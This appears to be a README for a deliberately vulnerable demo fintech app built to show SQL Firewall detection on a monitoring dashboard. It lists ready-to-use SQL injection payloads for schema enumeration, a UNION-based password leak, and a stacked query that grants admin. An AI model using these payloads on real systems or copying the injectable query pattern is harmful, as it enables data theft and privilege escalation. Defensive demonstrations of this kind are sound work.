# LuminaForge — Premium AI Wealth & Exclusive Marketplace

> ⚠️ **INTENTIONALLY VULNERABLE — DEMO ENVIRONMENT ONLY**
>
> This application contains **4 deliberately insecure API routes** that use raw
> SQL string concatenation. These vulnerabilities exist to demonstrate Oracle 26ai
> SQL Firewall detection capabilities alongside the **Aegis Vault** SOC dashboard.
>
> **NEVER deploy this application to production or any internet-accessible environment.**

---

## Overview

LuminaForge is a Dark Luxury fintech B2C app paired with the Aegis Vault SQL
Firewall defense dashboard. Its 4 standard-looking UI inputs are secretly SQL
injection attack vectors:

| Attack Point | UI Camouflage | Attack Class |
|---|---|---|
| 1 | Lux-Asset / Ticker Universal Search Bar | 3-step recon: boolean bypass → `user_tables` → `user_tab_columns` |
| 2 | Transaction Memo / Reference ID Filter | Conditional data exfiltration |
| 3 | Tax Institution ID (Statement page) | `UNION SELECT` credential leak |
| 4 | Batch Execution Note (Bulk transfer) | Stacked `;` destructive query |

## Prerequisites

1. Oracle DB 26ai PDB `AHDB2605_PDB1` with the `luminaforge` schema deployed
   (run `Oracle_DB_Cleanup.sql` then `Oracle_DB_Setup.sql` as SYS)
2. SQL Firewall enabled for the `luminaforge` user
3. **Aegis Vault** running on port `3000` (monitors violations in real time)

## Setup

```bash
cd luminaforge
cp .env.example .env
# Edit .env with your DB_PASSWORD and DB_CONNECTION_STRING
npm install
npm run dev
```

App runs on **http://localhost:3001**

## Demo Flow

1. Start Aegis Vault: `cd aegis-vault && npm run dev` (port 3000)
2. Start LuminaForge: `cd luminaforge && npm run dev` (port 3001)
3. In LuminaForge, paste demo payloads into the 4 attack inputs
4. Watch Aegis Vault Threat Feed light up within one poll cycle

### Demo Payloads

| # | Field | Benign Value | Attack Payload |
|---|---|---|---|
| 1 | Search Bar | `Rolex` | Step 1: `' OR '1'='1` · Step 2: `' UNION SELECT ROWNUM, table_name, 0, 'SCHEMA' FROM user_tables --` · Step 3: `' AND 1=0 UNION SELECT ROWNUM, column_name \|\| ' · ' \|\| data_type, 0, 'COLUMNS' FROM user_tab_columns WHERE table_name = 'USERS' --` |
| 2 | Reference ID Filter | `TRANSFER` | `x' OR user_id<>1 --` |
| 3 | Tax Institution ID | `1` | `0 UNION SELECT TO_CHAR(id), username, password, role FROM users` |
| 4 | Batch Execution Note | `Q2 rebalance` | `; UPDATE users SET role='admin' WHERE id=1 --` |

### Reset After Attack Point 4

```bash
# Run as SYS or luminaforge user in SQL Developer:
@scripts/reset-demo-data.sql
```

## Architecture

```
Port 3001 (LuminaForge) ──→ luminaforge DB user ──→ SQL Firewall ──→ DBA_SQL_FIREWALL_VIOLATIONS
                                                                              ↑
Port 3000 (Aegis Vault) ──────────────────────── polls ───────────────────────┘
                                                  WebSocket broadcasts to SOC dashboard
```
